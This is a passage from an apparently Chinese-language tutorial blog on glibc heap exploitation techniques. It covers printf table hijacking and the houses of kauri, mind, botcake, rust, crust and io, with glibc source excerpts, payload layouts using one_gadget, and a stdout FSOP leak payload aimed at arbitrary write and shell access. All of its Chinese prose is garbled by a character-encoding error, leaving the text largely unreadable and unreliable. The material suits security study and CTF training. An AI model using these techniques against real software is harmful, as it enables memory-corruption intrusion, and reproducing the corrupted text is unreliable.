ä½¿å…¶ä¸ä¸ºç©ºï¼ŒåŠ«æŒ <code>__printf_arginfo_table</code> ä½¿å…¶è¡¨ä¸­å­˜æ”¾çš„ <code>spec</code> çš„ä½ç½®æ˜¯ <code>backdoor()</code>ï¼Œæ‰§è¡Œåˆ° <code>printf</code> å‡½æ•°æ—¶å°±å¯ä»¥å°†æ‰§è¡ŒæµåŠ«æŒåˆ° <code>backdoor()</code></li><li>å¯è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²è§£æ</li></ul><blockquote><p>ç®€å•æ¥è¯´printfå¯¹è‡ªå®šä¹‰çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å¤„ç†ä¼˜å…ˆäºé»˜è®¤çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤„ç†ï¼Œæˆ‘ä»¬é€šè¿‡ç¯¡æ”¹<code>__printf_function_table</code>æ¥ä½¿ç¨‹åºè®¤ä¸ºå­˜åœ¨æ³¨å†Œè¿‡çš„è‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä»è€Œè§¦å‘<code>__printf_arginfo_table</code>ä¸Šçš„å‡½æ•°æŒ‡é’ˆ</p></blockquote><h3 id="åˆ©ç”¨åŸç†-9"><a href="#åˆ©ç”¨åŸç†-9" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>è°ƒç”¨å¤„ <code>1</code>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line">  <span class="comment">/* Use the slow path in case any printf handler is registered.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vfprintf-internal.c#1763</span></span><br><span class="line">nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line"></span><br><span class="line"><span class="comment">// printf-parsemb.c (__parse_one_specmbå‡½æ•°)</span></span><br><span class="line"><span class="comment">/* Get the format specification.  */</span></span><br><span class="line">spec-&gt;info.spec = (<span class="type">wchar_t</span>) *format++;</span><br><span class="line">spec-&gt;size = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>) <span class="comment">// åˆ¤æ–­æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">  || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">  || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span> <span class="comment">// åˆ¤æ–­æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">  <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment"> uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment"> the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">  || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec]) <span class="comment">// è°ƒç”¨__printf_arginfo_tableä¸­çš„å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">               (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">                &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹å¼ä¸ºï¼š</p><ul><li><code>__printf_function_table</code> å’Œ<code>__printf_arginfo_table</code> åˆ†åˆ«å†™ä¸º <code>chunk A</code> å’Œ <code>chunk B</code> çš„åœ°å€</li><li>è®¾å ä½ç¬¦ä¸º <code>Î±</code>ï¼Œæ­¤æ—¶ <code>chunk B</code> çš„å†…å®¹åº”è¯¥ä¸º <code>p64(0) x ord(Î±-2) + p64(one_gadget)</code></li></ul><p>è°ƒç”¨å¤„ <code>2</code>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vfprintf-internal.c#1962</span></span><br><span class="line"><span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">          &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">          &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Call the function.  */</span></span><br><span class="line">      function_done = __printf_function_table[(<span class="type">size_t</span>) spec](s, &amp;specs[nspecs_done].info, ptr); <span class="comment">// è°ƒç”¨__printf_function_tableä¸­çš„å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (function_done != <span class="number">-2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If an error occurred we don&#x27;t have information</span></span><br><span class="line"><span class="comment">         about # of chars.  */</span></span><br><span class="line">      <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Function has set errno.  */</span></span><br><span class="line">          done = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">goto</span> all_done;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">done_add</span> (function_done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹å¼ä¸ºï¼š</p><ul><li><code>__printf_function_table</code> å’Œ<code>__printf_arginfo_table</code> åˆ†åˆ«å†™ä¸º <code>chunk A</code> å’Œ <code>chunk B</code> çš„åœ°å€</li><li>è®¾å ä½ç¬¦ä¸º <code>Î±</code>ï¼Œæ­¤æ—¶ <code>chunk A</code> çš„å†…å®¹åº”è¯¥ä¸º <code>p64(0) x ord(Î±-2) + p64(one_gadget)</code></li></ul><p>è¯¥å¤„è°ƒç”¨åœ¨é«˜ç‰ˆæœ¬è¢«åˆ é™¤ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-9"><a href="#ç›¸å…³æŠ€å·§-9" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>è¯¥æŠ€å·§ä¸€èˆ¬å’Œ <code>largebin attack</code> ç»“åˆèµ·æ¥</li><li>åœ¨ä½äº <code>2.36</code> ç‰ˆæœ¬ä¸­ï¼Œ<code>__malloc_assert</code> ä¸­æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„è§£æ</li><li>è¿˜æœ‰ä¸€ä¸ª<code>__printf_va_arg_table</code> ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯æ¡ä»¶æ¯”è¾ƒè‹›åˆ»</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-9"><a href="#åˆ©ç”¨æ•ˆæœ-9" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>æ‰§è¡Œ <code>one_gadget</code></li><li>æ‰§è¡Œ <code>rop</code> æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</li></ul><h2 id="house-of-kauri"><a href="#house-of-kauri" class="headerlink" title="house of kauri"></a>house of kauri</h2><h3 id="æ¼æ´æˆå› -10"><a href="#æ¼æ´æˆå› -10" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-10"><a href="#é€‚ç”¨èŒƒå›´-10" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.26</code>â€”â€”<code>2.32</code></li></ul><h3 id="åˆ©ç”¨åŸç†-10"><a href="#åˆ©ç”¨åŸç†-10" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åˆ©ç”¨åŸç†å¾ˆç®€å•ï¼Œä¿®æ”¹ <code>tcachebin</code> çš„ <code>size</code>ï¼Œç„¶åä½¿å…¶è¢«æ”¾åˆ°ä¸åŒå¤§å°çš„ <code>tcachebin</code> é“¾è¡¨é‡Œé¢å»ã€‚æˆ‘æ„Ÿè§‰è¿™ä¸ªæŠ€å·§æ˜¯å¾ˆåŸºç¡€çš„ <code>tcachebin</code> æŠ€å·§ï¼Œç”šè‡³ä¸åº”è¯¥è¢«ç§°ä¹‹ä¸º <code>house of</code>ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-10"><a href="#ç›¸å…³æŠ€å·§-10" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>æ— </li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-10"><a href="#åˆ©ç”¨æ•ˆæœ-10" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>å¤šä¸ª <code>tcachebin</code> é“¾è¡¨ä¸­å­˜æ”¾åŒä¸€ä¸ª <code>chunk</code></li></ul><h2 id="house-of-mind"><a href="#house-of-mind" class="headerlink" title="house of mind"></a>house of mind</h2><h3 id="æ¼æ´æˆå› -11"><a href="#æ¼æ´æˆå› -11" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºï¼Œ<code>edit after free</code></p><h3 id="é€‚ç”¨èŒƒå›´-11"><a href="#é€‚ç”¨èŒƒå›´-11" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„ <code>chunk</code></li><li>ç¨‹åºåœ¨å­çº¿ç¨‹æ‰§è¡Œmalloc</li></ul><h3 id="åˆ©ç”¨åŸç†-11"><a href="#åˆ©ç”¨åŸç†-11" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><ul><li><p>é€šè¿‡å¤šçº¿ç¨‹æˆ–è€…ç‰¹å®šçš„åˆ†é…æ–¹å¼ï¼Œåˆ›å»ºä¸€å—éä¸»arenaçš„chunkA</p></li><li><p>ç„¶åé€šè¿‡chunkAçš„åœ°å€ç”¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br></pre></td></tr></table></figure><p>è¯¥æ–¹å¼è®¡ç®—å‡º<code>heap_for_ptr</code>çš„åœ°å€</p></li><li><p>åœ¨<code>heap_info_addr</code>å¤„ä¼ªé€ mstate ar_ptræŒ‡é’ˆæŒ‡å‘æ”»å‡»è€…æ§åˆ¶çš„ä¼ªé€ arenaåŒºåŸŸ</p></li><li><p>ä¹‹åä¿®æ”¹chunkAçš„<code>non_main_arena</code>æ ‡å¿—ä½ä¸º1</p></li><li><p>ä¹‹åé‡Šæ”¾chunkAï¼Œæ­¤æ—¶arena_for_chunk(A)ä¼šé€šè¿‡ä¼ªé€ çš„<code>heap_info_addr-&gt;ar_ptr</code>æ‰¾åˆ°ä¼ªé€ çš„arenaåŒºåŸŸ</p></li><li><p>è€Œä¼ªé€ çš„arenaåŒºåŸŸ å¯ä»¥ æ§åˆ¶ fastbin é“¾è¡¨å¤´ï¼Œå®ç°<strong>ä»»æ„åœ°å€åˆ†é…</strong>ï¼Œä»¥æ­¤å®ç°ä»»æ„åœ°å€å†™</p></li></ul><h3 id="ç›¸å…³æŠ€å·§-11"><a href="#ç›¸å…³æŠ€å·§-11" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>ä¸€èˆ¬æ¥è¯´ï¼Œå¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„ <code>chunk</code>ï¼Œè¿˜èƒ½å †æº¢å‡ºï¼Œå¾ˆå¤šæŠ€å·§éƒ½èƒ½ç”¨</li><li>è¿™ä¸ªæŠ€å·§æ˜¯å¸Œæœ›å¤§å®¶å…³æ³¨å¯¹äº <code>arena</code> çš„æ”»å‡»</li><li>ç”šè‡³å¯ä»¥ç›´æ¥ä¿®æ”¹ <code>thread_arena</code> è¿™ä¸ªå˜é‡</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-11"><a href="#åˆ©ç”¨æ•ˆæœ-11" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€å†™ä»»æ„å€¼</li></ul><h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><h3 id="æ¼æ´æˆå› -12"><a href="#æ¼æ´æˆå› -12" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p><code>double free</code></p><h3 id="é€‚ç”¨èŒƒå›´-12"><a href="#é€‚ç”¨èŒƒå›´-12" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.26</code>â€”â€” è‡³ä»Š</li><li>å¤šæ¬¡é‡Šæ”¾ <code>chunk</code> çš„èƒ½åŠ›</li></ul><h3 id="åˆ©ç”¨åŸç†-12"><a href="#åˆ©ç”¨åŸç†-12" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>è¯¥æŠ€å·§å¯ä»¥ç”¨äºç»•è¿‡ <code>tcache-&gt;key</code> çš„æ£€æŸ¥ï¼Œåˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯·7ä¸ªå¤§äºsizeå¤§äº0x80çš„chunkï¼Œç„¶åå†ç”³è¯·3ä¸ªï¼Œåˆ†åˆ«ä¸ºchunkAï¼ŒchunkBï¼ŒchunkCï¼ˆchunkCåªæ˜¯ç”¨æ¥éš”æ–­<code>top chunk</code>ï¼‰</li><li>é‡Šæ”¾å‰7ä¸ªchunkè¿›å…¥tcacheï¼Œä¹‹åé‡Šæ”¾chunkBè¿›å…¥unsortedbinï¼Œç„¶åé‡Šæ”¾chunkAä¸chunkBåˆå¹¶</li><li>ä¹‹åä»tcacheä¸­åˆ†é…ä¸€ä¸ªchunk</li><li>ç„¶åå†æ¬¡é‡Šæ”¾chunkBï¼Œä½¿å¾—chunkBè¿›å…¥tcacheï¼Œæ­¤æ—¶chunkBå°±æ—¢ä½äºunsortedbinä¹Ÿä½äºtcacheä¸­</li><li>ä¹‹åå†æ¬¡ç”³è¯·ä¸€ä¸ªchunkï¼Œå°±å¾—åˆ°äº†chunkBï¼Œä½†æ˜¯æ­¤æ—¶çš„chunkBè¿˜ä½äºunsortedbin</li></ul><h3 id="ç›¸å…³æŠ€å·§-12"><a href="#ç›¸å…³æŠ€å·§-12" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>åœ¨é«˜ç‰ˆæœ¬éœ€è¦ç»•è¿‡æŒ‡é’ˆä¿æŠ¤çš„æ£€æŸ¥</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-12"><a href="#åˆ©ç”¨æ•ˆæœ-12" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>æ„é€ å‡º<strong>å †é‡å </strong>ï¼Œä¸ºåç»­åˆ©ç”¨åšå‡†å¤‡</li></ul><h2 id="house-of-rust"><a href="#house-of-rust" class="headerlink" title="house of rust"></a>house of rust</h2><h3 id="æ¼æ´æˆå› -13"><a href="#æ¼æ´æˆå› -13" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-13"><a href="#é€‚ç”¨èŒƒå›´-13" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.26</code>â€”â€”è‡³ä»Š</li><li>å¯ä»¥è¿›è¡Œ<code>tcache stash unlinking</code>æ”»å‡»</li><li>å¯ä»¥è¿›è¡Œ<code>largebin attack</code></li><li>ä¸éœ€è¦æ³„éœ²åœ°å€</li></ul><h3 id="åˆ©ç”¨åŸç†-13"><a href="#åˆ©ç”¨åŸç†-13" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p><strong>å‰ç½®çŸ¥è¯†</strong></p><p>é¦–å…ˆéœ€è¦çŸ¥é“<code>tcachebin stash unlinking</code>ï¼Œä¸‹é¢ç§°ä¹‹ä¸º<code>TSU</code>æŠ€å·§ï¼š</p><ul><li><code>tcachebin[A]</code>ä¸ºç©º</li><li><code>smallbin[A]</code>æœ‰<code>8</code>ä¸ª</li><li>ä¿®æ”¹ç¬¬<code>8</code>ä¸ª<code>smallbin chunk</code>çš„<code>bk</code>ä¸º<code>addr</code></li><li>åˆ†é…<code>malloc(A)</code>çš„æ—¶å€™ï¼Œ<code>addr+0x10</code>ä¼šè¢«å†™ä¸€ä¸ª<code>libc</code>åœ°å€</li></ul><p>è¿˜è¦çŸ¥é“<code>tcachebin stash unlinking+</code>ï¼Œä¸‹é¢ç§°ä¹‹ä¸º<code>TSU+</code>æŠ€å·§ï¼š</p><ul><li><code>tcachebin[A]</code>ä¸ºç©º</li><li><code>smallbin[A]</code>æœ‰<code>8</code>ä¸ª</li><li>ä¿®æ”¹ç¬¬<code>7</code>ä¸ª<code>smallbin chunk</code>çš„<code>bk</code>ä¸º<code>addr</code>ï¼Œè¿˜è¦ä¿è¯<code>*(addr+0x18)</code>æ˜¯ä¸€ä¸ªåˆæ³•å¯å†™çš„åœ°å€</li><li>åˆ†é…<code>malloc(A)</code>çš„æ—¶å€™ï¼Œ<code>addr</code>ä¼šè¢«é“¾å…¥åˆ°<code>tcachebin</code>ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥åˆ†é…åˆ°<code>addr</code>å¤„</li></ul><p><strong>ç¬¬ä¸€é˜¶æ®µï¼šå †é£æ°´å¸ƒå±€ï¼ˆHeap Feng Shuiï¼‰</strong></p><ul><li>é¦–å…ˆå…ˆåˆ†é…14ä¸ª0x90çš„chunk(ç¼–å·1-14)ï¼Œç„¶åå†æ¥æ›¿é‡Šæ”¾åˆ°tcacheå’Œsmallbinä¸­ï¼ˆ1\3\5\7\9\11\13é‡Šæ”¾åˆ°tcahceâ€¦.ï¼‰</li><li>ä¹‹åé€šè¿‡åˆ†é…å¤§chunkå°†unsortedbinä¸­çš„éƒ½æ”¾å…¥smallbin</li></ul><p><strong>ç¬¬äºŒé˜¶æ®µï¼šTcache Stashing Unlink+ ç»“åˆ Largebin æ”»å‡»</strong></p><ul><li>ç„¶åé€šè¿‡WAFä¿®æ”¹chunk14çš„sizeç‰‡æ®µä¸º0xB0ï¼Œä¹‹åå†æ¬¡é‡Šæ”¾chunk14åˆ°tcahce[0xB0]ä¸­ï¼Œæ­¤æ—¶ä»–çš„bkå°±æ˜¯tcahce_keyï¼Œä¹Ÿå°±æ˜¯<code>&amp;tcahce_perthread_struct+0x10</code>ï¼Œä½†æ˜¯åŒæ—¶ä¹Ÿé€ æˆäº†smallbiné“¾çš„ç ´å</li><li>å†æ¬¡ä¿®æ”¹chunk14çš„bkçš„æœ€ä½å­—èŠ‚ä¸º0x80ï¼ŒæŒ‡å‘<code>tcache_perthread_struct + 0x80 - 0x18</code>ï¼ˆ0x30 tcacheå¤´éƒ¨é™„è¿‘ï¼‰</li><li>ä¹‹åé€šè¿‡largebin attackä¿®æ”¹chunk14çš„fdä»¥ä¿®å¤smallbiné“¾</li><li>æ¸…ç©ºtcaheç„¶åå†æ¬¡åˆ†é…0x90å—ï¼Œè§¦å‘Tcache Stashing Unlink+æœºåˆ¶ï¼Œä½¿å¾—0x90 tcacheå¤´éƒ¨æŒ‡å‘<code>tcache_perthread_struct + 0x80</code></li></ul><p><strong>ç¬¬ä¸‰é˜¶æ®µï¼šTcache Stashing Unlink ç»“åˆäºŒæ¬¡Largebinæ”»å‡»</strong></p><ul><li>åˆ†é…15ä¸ª0xa0çš„å—</li><li>é€šè¿‡å°†<code>Tcache Stashing Unlink</code>å°†libcåœ°å€å†™å…¥<code>tcache_perthread_struct</code></li></ul><p><strong>ç¬¬å››é˜¶æ®µï¼šstdout FSOPæ³„éœ²libc</strong></p><ul><li>åˆ©ç”¨ç¬¬ä¸‰é˜¶æ®µå†™å…¥çš„libcåœ°å€ï¼Œéƒ¨åˆ†å†™ï¼Œå¤šæ¬¡çˆ†ç ´ï¼Œå³å¯å°†chunkåˆ†é…åˆ°<code>_IO_2_1_stdout_</code>ç»“æ„</li><li>ä¹‹åé€šè¿‡ç»“æ„ä½“å¤å†™å³å¯è§¦å‘libcæ³„éœ²ï¼Œæ³„éœ²å®Œå°±ç®€å•å¤šäº†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line">payload=p64(_flags)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br></pre></td></tr></table></figure><p><strong>ç¬¬äº”é˜¶æ®µï¼šæœ€ç»ˆShellè·å–</strong></p><ul><li><code>__free_hook</code>å†™systemæˆ–è€…onegadgetéƒ½æ˜¯å¯ä»¥çš„</li></ul><p>ä¸Šé¢çš„è¿‡ç¨‹æœ€å¥½çš„æƒ…å†µä¸‹éœ€è¦çˆ†ç ´<code>1/16</code>ï¼Œæœ€å·®<code>1/256</code>ã€‚</p><p><strong>ä½†æ˜¯</strong>ï¼Œ<code>2.34</code>ä¹‹åï¼Œ<code>tcache_key</code>æ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œä¸æ˜¯<code>tcache_perthread_struct + 0x10</code>äº†ã€‚</p><p>æ‰€ä»¥ï¼Œæ­¤æ—¶å¯ä»¥åŠ ä¸Š<code>largebin attack</code>ï¼ŒæŠŠä»¥ä¸Šçš„ç¬¬äºŒæ­¥å˜ä¸ºï¼šç»§ç»­ç”¨<code>largebin attack</code>å‘å…¶<code>bk</code>å†™ä¸€ä¸ªå †åœ°å€ï¼Œç„¶åè¿˜è¦éƒ¨åˆ†å†™<code>bk</code>ä½¿å…¶è½åœ¨<code>tcache_perthread_struct</code>åŒºåŸŸã€‚å…¶ä»–æ­¥éª¤ä¸€æ ·ã€‚</p><p>æˆ–è€…ï¼Œåœ¨<code>smallbin</code>é‡Œé¢æ”¾<code>9</code>ä¸ªï¼Œè¿™æ ·ç¬¬<code>8</code>ä¸ªçš„<code>bk</code>è‚¯å®šå°±æ˜¯ä¸€ä¸ªå †åœ°å€ã€‚æ­¤æ—¶å°±éœ€è¦çˆ†ç ´<code>1/16</code>çš„å †ï¼Œ<code>1/16</code>çš„<code>glibc</code>åœ°å€ï¼ŒæˆåŠŸçš„æ¦‚ç‡æ˜¯<code>1/256</code>ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-13"><a href="#ç›¸å…³æŠ€å·§-13" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>æ€»çš„æ¥è¯´ï¼Œå°±æ˜¯åˆ©ç”¨<code>tcachebin stash unlinking</code>æ‰“<code>tcache_perthread_struct</code></li><li>åˆ©ç”¨<code>largebin attack</code>æ„é€ åˆæ³•åœ°å€</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-13"><a href="#åˆ©ç”¨æ•ˆæœ-13" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li></ul><h2 id="house-of-crust"><a href="#house-of-crust" class="headerlink" title="house of crust"></a>house of crust</h2><h3 id="æ¼æ´æˆå› -14"><a href="#æ¼æ´æˆå› -14" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-14"><a href="#é€‚ç”¨èŒƒå›´-14" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.26</code>â€”â€”<code>2.37</code></li><li>å¯ä»¥è¿›è¡Œ<code>tcache stash unlinking</code>æ”»å‡»</li><li>å¯ä»¥è¿›è¡Œ<code>largebin attack</code></li><li>ä¸éœ€è¦æ³„éœ²åœ°å€</li></ul><h3 id="åˆ©ç”¨åŸç†-14"><a href="#åˆ©ç”¨åŸç†-14" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>å…¶ä»–æ­¥éª¤å’Œä¸Šé¢çš„<code>house of rust</code>ä¸€æ ·ï¼Œä½†æ˜¯åˆ°ç¬¬äº”æ­¥çš„æ—¶å€™ï¼Œå»ä¿®æ”¹<code>global_max_fast</code></p><p>åé¢çš„æ­¥éª¤å’Œ<code>house of corrosion</code>æ˜¯ä¸€æ ·çš„ï¼Œé€šè¿‡å†™åŸè¯­æ‰“<code>stderr</code>ä¿®æ”¹<code>one_gadget</code>æ‹¿åˆ°<code>shell</code>ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-14"><a href="#ç›¸å…³æŠ€å·§-14" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li><code>house of crust = house of corrosion + house of rust</code></li><li><code>2.37</code>ä¹‹åï¼Œ<code>house of corrosion</code>ä½¿ç”¨å—é™</li></ul><h2 id="house-of-io"><a href="#house-of-io" class="headerlink" title="house of io"></a>house of io</h2><h3 id="æ¼æ´æˆå› -15"><a href="#æ¼æ´æˆå› -15" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-15"><a href="#é€‚ç”¨èŒƒå›´-15" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.26</code>â€”â€” è‡³ä»Š</li></ul><h3 id="åˆ©ç”¨åŸç†-15"><a href="#åˆ©ç”¨åŸç†-15" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>å…¶ä»–åšå®¢ä¸Šå¯¹è¯¥æ–¹æ³•çš„ä»‹ç»å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The tcache_perthread_object is allocated when the heap is created. Furthermore, it is stored right at the heap&#x27;s beginning (at a relatively low memory address). The safe-linking mitigation aims to protect the fd/next pointer within the free lists. However, the head of each free-list is not protected. Additionally, freeing a chunk and placing it into the tcachebin also places a non-protected pointer to the appropriate tcache entry in the 2nd qword of a chunks&#x27; user data. The House of IO assumes one of three scenarios for the bypass to work. First, any attacker with a controlled linear buffer underflow over a heap buffer, or a relative arbitrary write will be able to corrupt the tcache. Secondly, a UAF bug allowing to read from a freed tcache eligible chunk leaks the tcache and with that, the heap base. Thirdly, a badly ordered set of calls to free(), ultimately passing the address of the tcache itself to free, would link the tcache into the 0x290 sized tcachebin. Allocating it as a new chunk would mean complete control over the tcache&#x27;s values.</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥ï¼Œå…¶å®å°±æ˜¯å¯¹ <code>tcache_perthread_struct</code> ç»“æ„ä½“çš„æ”»å‡»ï¼Œæƒ³åŠæ³•å°†å…¶é‡Šæ”¾æ‰ï¼Œç„¶åå†ç”³è¯·å›æ¥ï¼Œç”³è¯·å›æ¥çš„æ—¶å€™å°±èƒ½æ§åˆ¶æ•´ä¸ª <code>tcache</code> çš„åˆ†é…ã€‚</p><h3 id="ç›¸å…³æŠ€å·§-15"><a href="#ç›¸å…³æŠ€å·§-15" class="headerlink" 